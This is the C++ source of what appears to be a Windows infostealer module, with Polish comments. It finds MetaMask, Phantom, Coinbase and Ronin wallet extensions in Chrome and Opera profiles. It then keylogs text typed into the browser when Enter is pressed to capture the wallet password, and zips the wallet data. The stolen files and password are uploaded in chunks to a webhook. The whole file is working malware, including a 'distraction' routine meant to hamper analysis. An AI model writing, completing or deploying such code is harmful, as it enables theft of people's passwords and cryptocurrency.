#include "common.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <shlwapi.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include <psapi.h>
#include <winhttp.h>
#include <shldisp.h>
#include <atlbase.h>
#include <random> // Dla rozpraszacza

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")


// --- Implementacja miniz.c (zakładamy, że jest dołączona/linkowana) ---
// (TUTAJ POWINNA BYĆ KOMPLETNA ZAWARTOŚĆ MINIZ.C)


// --- Funkcje pomocnicze ---
std::string wstringToString_browsewallet(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

static bool CreateEmptyZip(const std::wstring& zipPath) {
    HANDLE h = CreateFileW(zipPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    unsigned char eocd[22] = { 'P','K', 5,6, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0 };
    DWORD written = 0;
    BOOL ok = WriteFile(h, eocd, sizeof(eocd), &written, NULL);
    CloseHandle(h);
    return ok && written == sizeof(eocd);
}

// Funkcja rozpraszająca
void performBrowseWalletDistraction() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(100, 1000);
    volatile int a = distrib(gen);
    volatile int b = distrib(gen);
    volatile int c = a * b / (a - 5);
    (void)c; // Unikaj ostrzeżenia o niewykorzystanej zmiennej
}


// --- Deklaracje funkcji wewnętrznych ---
void sendBrowserDataAndFiles(const BrowserWallet& wallet, const std::string& capturedPassword, const std::string& webhookUrl);
static bool ZipBrowserWalletViaShell(const std::wstring& folderPath, std::wstring& outZipPath);
static bool sendMultipart(const std::string& webhookUrl, const std::string& boundary, const std::string& payloadJson, const std::vector<std::pair<std::string, std::vector<char>>>& files, const std::string& contextLabel);
static bool sendFolderInChunks(const std::wstring& folderPath, const std::string& webhookUrl, const std::string& contextLabel, const std::string& capturedPassword);
static bool ZipFilesToTempZip(const std::vector<std::wstring>& filePaths, std::wstring& outZipPath);
static bool sendZippedFile(const std::wstring& zipPath, const std::string& webhookUrl, const std::string& contextLabel, const std::string& capturedPassword);
static void sendFolderInChunks(const std::vector<std::wstring>& allFilePaths, const std::string& webhookUrl, const std::string& contextLabel, const std::string& capturedPassword);


// --- Główna logika modułu ---

std::vector<BrowserWallet> checkBrowserWallets() {
    std::vector<BrowserWallet> foundWallets;
    logToFile("[BrowseWallet] Rozpoczynanie sprawdzania portfeli przeglądarkowych...");

    const std::vector<std::pair<std::string, const wchar_t*>> walletTargets = {
        {"Metamask", L"nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom", L"bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"Coinbase Wallet", L"hnfanknocfeofbddgcijnmhnfnlfigol"},
        {"Ronin Wallet", L"fnjhmkhhmkbjkkabndcnnogagogbneec"}
    };

    const std::vector<std::tuple<std::string, const wchar_t*, KNOWNFOLDERID, const wchar_t*>> browserTargets = {
        {"Google Chrome", L"chrome.exe", FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data"},
        {"Opera", L"opera.exe", FOLDERID_RoamingAppData, L"\\Opera Software\\Opera Stable"},
        {"Opera GX", L"opera.exe", FOLDERID_RoamingAppData, L"\\Opera Software\\Opera GX Stable"},
    };

    for (const auto& browser : browserTargets) {
        PWSTR pszPath = NULL;
        if (SUCCEEDED(SHGetKnownFolderPath(std::get<2>(browser), 0, NULL, &pszPath))) {
            std::wstring userDataPath = pszPath;
            CoTaskMemFree(pszPath);
            userDataPath += std::get<3>(browser);

            std::vector<std::wstring> profiles = {L"Default"};
            for (int i = 1; i <= 10; ++i) profiles.push_back(L"Profile " + std::to_wstring(i));
            
            for (const auto& profile : profiles) {
                std::wstring profilePath = userDataPath + L"\\" + profile;
                if (!PathFileExistsW(profilePath.c_str())) continue;

                std::wstring extensionsPath = profilePath + L"\\Extensions";
                std::wstring dataPathRoot = profilePath + L"\\Local Extension Settings";
                
                for (const auto& wallet : walletTargets) {
                    std::wstring fullExtensionPath = extensionsPath + L"\\" + wallet.second;
                    if (PathFileExistsW(fullExtensionPath.c_str())) {
                        std::wstring fullDataPath = dataPathRoot + L"\\" + wallet.second;
                        logToFile("[BrowseWallet] Znaleziono " + wallet.first + " w " + std::get<0>(browser) + " (" + wstringToString_browsewallet(profile) + ")");
                        foundWallets.push_back({wallet.first, std::get<0>(browser), profile, std::get<1>(browser), fullExtensionPath, fullDataPath, false});
                    }
                }
            }
        }
    }

    if (foundWallets.empty()) {
        logToFile("[BrowseWallet] Nie znaleziono portfeli przeglądarkowych.");
    }
    return foundWallets;
}


void monitorAndExfiltrateBrowserWallets(std::vector<BrowserWallet> foundWallets, const std::string& webhookUrl) {
    if (foundWallets.empty()) {
        logToFile("[BrowseWallet] Wątek monitorujący uruchomiony, ale brak portfeli do śledzenia.");
        return;
    }
    logToFile("[BrowseWallet] Wątek monitorujący aktywny. Nasłuchiwanie na hasła w przeglądarkach.");

    getGlobalKeystrokeBuffer(true); // Wyczyść bufor na starcie

    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
        
        // ROZPRASZACZ
        if(GetTickCount() % 100 == 0) performBrowseWalletDistraction();

        HWND foreground = GetForegroundWindow();
        if (!foreground) continue;

        DWORD pid; GetWindowThreadProcessId(foreground, &pid);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (!hProcess) continue;

        wchar_t processPath[MAX_PATH];
        bool isBrowserFocused = false;
        std::wstring focusedBrowserProcess;
        if (GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH)) {
            for(const auto& wallet : foundWallets) {
                if (_wcsicmp(PathFindFileNameW(processPath), wallet.process_name.c_str()) == 0) {
                    isBrowserFocused = true;
                    focusedBrowserProcess = wallet.process_name;
                    break;
                }
            }
        }
        CloseHandle(hProcess);

        if (isBrowserFocused) {
            if (GetAsyncKeyState(VK_RETURN) & 0x0001) {
                std::string capturedText = getGlobalKeystrokeBuffer(true);
                if (!capturedText.empty()) {
                    logToFile("[BrowseWallet] Naciśnięto Enter w przeglądarce " + wstringToString_browsewallet(focusedBrowserProcess) + ". Przechwycono: " + capturedText);

                    // Nowa logika: wyślij dla pierwszego nieobsłużonego portfela w tej przeglądarce i profilu
                    for (auto& wallet : foundWallets) {
                        if (!wallet.data_sent && wallet.process_name == focusedBrowserProcess) {
                            // Sprawdzaj, czy dane z tego profilu nie zostały już wysłane dla tego portfela
                            bool already_sent_for_profile = false;
                            for(const auto& w : foundWallets) {
                                if(w.name == wallet.name && w.browser == wallet.browser && w.profile_name == wallet.profile_name && w.data_sent) {
                                    already_sent_for_profile = true;
                                    break;
                                }
                            }

                            if(!already_sent_for_profile) {
                                logToFile("[BrowseWallet] Dopasowano portfel " + wallet.name + " w przeglądarce (" + wstringToString_browsewallet(wallet.profile_name) + "). Wysyłanie danych...");
                                std::thread(sendBrowserDataAndFiles, wallet, capturedText, webhookUrl).detach();
                                
                                // Oznacz wszystkie portfele tego samego typu w tym samym profilu jako obsłużone
                                for(auto& w_to_mark : foundWallets) {
                                    if(w_to_mark.name == wallet.name && w_to_mark.browser == wallet.browser && w_to_mark.profile_name == wallet.profile_name) {
                                        w_to_mark.data_sent = true;
                                    }
                                }
                                break;
                            }
                        }
                    }
                }
            }
        }
        
        bool all_done = true;
        for(const auto& wallet : foundWallets) { if (!wallet.data_sent) { all_done = false; break; } }
        if (all_done) {
            logToFile("[BrowseWallet] Wszystkie portfele przeglądarkowe obsłużone. Zamykanie wątku monitorującego.");
            break;
        }
    }
}


void sendBrowserDataAndFiles(const BrowserWallet& wallet, const std::string& capturedPassword, const std::string& webhookUrl) {
    logToFile("[BrowseWallet] Rozpoczynanie wysyłki dla " + wallet.name + " z profilu " + wstringToString_browsewallet(wallet.profile_name));
    std::string contextLabel = wallet.name + "_" + wallet.browser + "_" + wstringToString_browsewallet(wallet.profile_name);
    std::replace(contextLabel.begin(), contextLabel.end(), ' ', '_');

    // Krok 1: Zbierz wszystkie pliki
    std::vector<std::wstring> allFilePaths;
    std::vector<std::wstring> stack;
    stack.push_back(wallet.data_path);
    while (!stack.empty()) {
        std::wstring currentPath = stack.back();
        stack.pop_back();
        WIN32_FIND_DATAW findData;
        HANDLE hFind = FindFirstFileW((currentPath + L"\\*").c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) continue;
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
            std::wstring fullPath = currentPath + L"\\" + findData.cFileName;
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                stack.push_back(fullPath);
            } else {
                allFilePaths.push_back(fullPath);
            }
        } while (FindNextFileW(hFind, &findData) != 0);
        FindClose(hFind);
    }

    if (allFilePaths.empty()) {
        logToFile("[BrowseWallet] Brak plików do wysłania dla " + wallet.name);
        return;
    }

    // Krok 2: Spakuj wszystko do jednego ZIP-a
    std::wstring tempZipPath;
    if (!ZipFilesToTempZip(allFilePaths, tempZipPath)) {
        logToFile("[BrowseWallet] ERROR: Nie udało się utworzyć głównego pliku ZIP.");
        return;
    }

    // Krok 3: Sprawdź rozmiar
    HANDLE hFile = CreateFileW(tempZipPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        logToFile("[BrowseWallet] ERROR: Nie można otworzyć pliku ZIP do sprawdzenia rozmiaru.");
        DeleteFileW(tempZipPath.c_str());
        return;
    }
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    CloseHandle(hFile);

    // Krok 4: Zdecyduj o strategii wysyłki
    if (fileSize.QuadPart < (8.5 * 1024 * 1024)) { // POPRAWIONY LIMIT
        logToFile("[BrowseWallet] Plik ZIP < 8.5MB. Wysyłanie w całości.");
        sendZippedFile(tempZipPath, webhookUrl, contextLabel, capturedPassword);
    } else {
        logToFile("[BrowseWallet] Plik ZIP > 8.5MB. Wysyłanie w częściach.");
        sendFolderInChunks(allFilePaths, webhookUrl, contextLabel, capturedPassword);
    }

    DeleteFileW(tempZipPath.c_str());
}

static bool ZipBrowserWalletViaShell(const std::wstring& folderPath, std::wstring& outZipPath) {
    logToFile("[BrowseWallet] Zipping folder: " + wstringToString_browsewallet(folderPath));
    wchar_t tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    
    wchar_t tmpFile[MAX_PATH];
    GetTempFileNameW(tmpPath, L"bwz", 0, tmpFile);
    outZipPath = tmpFile;

    DeleteFileW(outZipPath.c_str());
    outZipPath += L".zip";

    if (!CreateEmptyZip(outZipPath)) {
        logToFile("[BrowseWallet] Failed to create empty zip file.");
        return false;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr)) {
        logToFile("[BrowseWallet] CoInitializeEx failed.");
        return false;
    }

    IShellDispatch* pShell = nullptr;
    hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pShell);
    if (FAILED(hr)) {
        logToFile("[BrowseWallet] CoCreateInstance for IShellDispatch failed.");
        CoUninitialize();
        return false;
    }

    Folder* pZip = nullptr;
    VARIANT vZip; VariantInit(&vZip); vZip.vt = VT_BSTR; vZip.bstrVal = SysAllocString(outZipPath.c_str());
    hr = pShell->NameSpace(vZip, &pZip);
    VariantClear(&vZip);
    if (FAILED(hr)) {
        logToFile("[BrowseWallet] pShell->NameSpace(zip) failed.");
        pShell->Release();
        CoUninitialize();
        return false;
    }

    Folder* pSrc = nullptr;
    VARIANT vSrc; VariantInit(&vSrc); vSrc.vt = VT_BSTR; vSrc.bstrVal = SysAllocString(folderPath.c_str());
    hr = pShell->NameSpace(vSrc, &pSrc);
    VariantClear(&vSrc);
    if (SUCCEEDED(hr) && pSrc) {
        FolderItems* pItems = nullptr;
        hr = pSrc->Items(&pItems);
        if (SUCCEEDED(hr) && pItems) {
            logToFile("[BrowseWallet] Copying items to zip...");
            VARIANT vOpt; VariantInit(&vOpt); vOpt.vt = VT_I4; vOpt.lVal = 4 | 16; // FOF_NO_UI
            pZip->CopyHere(CComVariant(pItems), vOpt);
            Sleep(2000); // Give shell time to copy
            pItems->Release();
        } else {
            logToFile("[BrowseWallet] pSrc->Items failed.");
        }
        pSrc->Release();
    } else {
        logToFile("[BrowseWallet] pShell->NameSpace(src) failed.");
    }
    
    pZip->Release();
    pShell->Release();
    CoUninitialize();
    
    logToFile("[BrowseWallet] Zipping completed.");
    return true;
}

static bool sendMultipart(const std::string& webhookUrl, const std::string& boundary, const std::string& payloadJson, const std::vector<std::pair<std::string, std::vector<char>>>& files, const std::string& contextLabel) {
    URL_COMPONENTSW urlComp; wchar_t hostName[256], urlPath[2048];
    memset(&urlComp, 0, sizeof(urlComp)); urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256; urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 2048;
    std::wstring wWebhookUrl(webhookUrl.begin(), webhookUrl.end());
    if (!WinHttpCrackUrl(wWebhookUrl.c_str(), (DWORD)wWebhookUrl.length(), 0, &urlComp)) {
        logToFile("[BrowseWallet] ERROR: WinHttpCrackUrl failed (" + contextLabel + ")");
        return false;
    }

    HINTERNET hSession = WinHttpOpen(L"StealthApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { logToFile("[BrowseWallet] WinHttpOpen failed (" + contextLabel + ")"); return false; }
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { logToFile("[BrowseWallet] WinHttpConnect failed (" + contextLabel + ")"); WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { logToFile("[BrowseWallet] WinHttpOpenRequest failed (" + contextLabel + ")"); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::string contentTypeHeader = "Content-Type: multipart/form-data; boundary=" + boundary;
    std::wstring wContentType(contentTypeHeader.begin(), contentTypeHeader.end());
    WinHttpAddRequestHeaders(hRequest, wContentType.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    std::vector<char> body;
    {
        std::stringstream head;
        head << "--" << boundary << "\r\n";
        head << "Content-Disposition: form-data; name=\"payload_json\"\r\n";
        head << "Content-Type: application/json\r\n\r\n";
        head << payloadJson << "\r\n";
        std::string s = head.str(); body.insert(body.end(), s.begin(), s.end());
    }
    int idx = 1;
    for (const auto& f : files) {
        std::stringstream fp;
        fp << "--" << boundary << "\r\n";
        fp << "Content-Disposition: form-data; name=\"file" << idx++ << "\"; filename=\"" << f.first << "\"\r\n";
        fp << "Content-Type: application/octet-stream\r\n\r\n";
        std::string hdr = fp.str(); body.insert(body.end(), hdr.begin(), hdr.end());
        body.insert(body.end(), f.second.begin(), f.second.end());
        body.insert(body.end(), {'\r','\n'});
    }
    std::string end = "--" + boundary + "--\r\n"; body.insert(body.end(), end.begin(), end.end());

    bool ok = false;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body.data(), (DWORD)body.size(), (DWORD)body.size(), 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD status = 0, sz = sizeof(status);
            if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX)) {
                logToFile("[BrowseWallet] Webhook status (" + contextLabel + "): " + std::to_string(status));
                ok = status < 400;
            } else {
                ok = true;
            }
        }
    } else {
        logToFile("[BrowseWallet] ERROR: WinHttpSendRequest failed (" + contextLabel + "): " + std::to_string(GetLastError()));
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return ok;
}

static bool ZipFilesToTempZip(const std::vector<std::wstring>& filePaths, std::wstring& outZipPath) {
    wchar_t tmpPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmpPath)) return false;
    wchar_t tmpFile[MAX_PATH];
    if (!GetTempFileNameW(tmpPath, L"bwz", 0, tmpFile)) return false;
    outZipPath = tmpFile;
    DeleteFileW(outZipPath.c_str());
    outZipPath += L".zip";
    if (!CreateEmptyZip(outZipPath)) return false;

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr)) return false;

    IShellDispatch* pShell = nullptr;
    hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pShell);
    if (FAILED(hr) || !pShell) { CoUninitialize(); return false; }

    Folder* pZip = nullptr;
    VARIANT vZip; VariantInit(&vZip); vZip.vt = VT_BSTR; vZip.bstrVal = SysAllocString(outZipPath.c_str());
    hr = pShell->NameSpace(vZip, &pZip);
    VariantClear(&vZip);
    if (FAILED(hr) || !pZip) { pShell->Release(); CoUninitialize(); return false; }

    for (const auto& fullPath : filePaths) {
        const wchar_t* fname = PathFindFileNameW(fullPath.c_str());
        std::wstring parent = fullPath.substr(0, fullPath.length() - wcslen(fname));
        Folder* pSrc = nullptr;
        VARIANT vSrc; VariantInit(&vSrc); vSrc.vt = VT_BSTR; vSrc.bstrVal = SysAllocString(parent.c_str());
        hr = pShell->NameSpace(vSrc, &pSrc);
        VariantClear(&vSrc);
        if (SUCCEEDED(hr) && pSrc) {
            FolderItem* pItem = nullptr;
            BSTR bname = SysAllocString(fname);
            pSrc->ParseName(bname, &pItem);
            SysFreeString(bname);
            if (pItem) {
                VARIANT vItem; VariantInit(&vItem); vItem.vt = VT_DISPATCH; vItem.pdispVal = pItem;
                VARIANT vOpt; VariantInit(&vOpt); vOpt.vt = VT_I4; vOpt.lVal = 16; // FOF_SILENT
                pZip->CopyHere(vItem, vOpt);
                Sleep(200);
                pItem->Release();
            }
            pSrc->Release();
        }
    }

    pZip->Release();
    pShell->Release();
    CoUninitialize();
    return true;
}

static bool sendZippedFile(const std::wstring& zipPath, const std::string& webhookUrl, const std::string& contextLabel, const std::string& capturedPassword) {
    std::ifstream zf(zipPath, std::ios::binary | std::ios::ate);
    if (!zf.is_open()) return false;
    std::streamsize sz = zf.tellg(); zf.seekg(0, std::ios::beg);
    std::vector<char> data(static_cast<size_t>(sz)); zf.read(data.data(), sz); zf.close();

    std::vector<std::pair<std::string, std::vector<char>>> files;
    files.emplace_back(contextLabel + ".zip", std::move(data));
    
    // NAPRAWA BŁĘDU: Uproszczona konstrukcja payloadu
    std::string password_field = capturedPassword.empty() ? "" : (std::string(", { \"name\": \"Captured Password\", \"value\": \"||") + capturedPassword + "||" + "\" }");
    
    std::stringstream payload_ss;
    payload_ss << "{ \"content\": null, \"username\": \"Wallet Monitor\", \"embeds\": [{ \"title\": \"" << contextLabel << "\", \"color\": 3447003, \"fields\": [ { \"name\": \"Status\", \"value\": \"Data files attached.\" } " << password_field << " ] }] }";

    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    return sendMultipart(webhookUrl, boundary, payload_ss.str(), files, contextLabel);
}

static void sendFolderInChunks(const std::vector<std::wstring>& allFilePaths, const std::string& webhookUrl, const std::string& contextLabel, const std::string& capturedPassword) {
    const size_t LIMIT = 8.5 * 1024 * 1024; // POPRAWIONY LIMIT
    std::vector<std::wstring> batchPaths;
    size_t batchBytes = 0;
    int part = 1;

    auto flushBatch = [&](bool isFinal) {
        if (batchPaths.empty()) return;
        std::string finalLabel = contextLabel + (isFinal ? " (Final)" : " (Part " + std::to_string(part++) + ")");
        std::wstring tempZip;
        if (ZipFilesToTempZip(batchPaths, tempZip)) {
            sendZippedFile(tempZip, webhookUrl, finalLabel, capturedPassword);
            DeleteFileW(tempZip.c_str());
        }
        batchPaths.clear();
        batchBytes = 0;
    };

    for (const auto& fp : allFilePaths) {
        HANDLE hf = CreateFileW(fp.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) continue;
        LARGE_INTEGER li;
        if (!GetFileSizeEx(hf, &li)) { CloseHandle(hf); continue; }
        CloseHandle(hf);
        size_t fsz = static_cast<size_t>(li.QuadPart);

        if (fsz > LIMIT) {
            if (!batchPaths.empty()) {
                flushBatch(false);
            }
            std::vector<std::wstring> largeFileBatch = {fp};
            std::wstring tempZip;
            if (ZipFilesToTempZip(largeFileBatch, tempZip)) {
                 sendZippedFile(tempZip, webhookUrl, contextLabel + " (Large File Part " + std::to_string(part++) + ")", capturedPassword);
                 DeleteFileW(tempZip.c_str());
            }
            continue;
        }
        
        if (!batchPaths.empty() && batchBytes + fsz > LIMIT) {
            flushBatch(false);
        }
        batchPaths.push_back(fp);
        batchBytes += fsz;
    }

    if (!batchPaths.empty()) {
        flushBatch(true);
    }
}
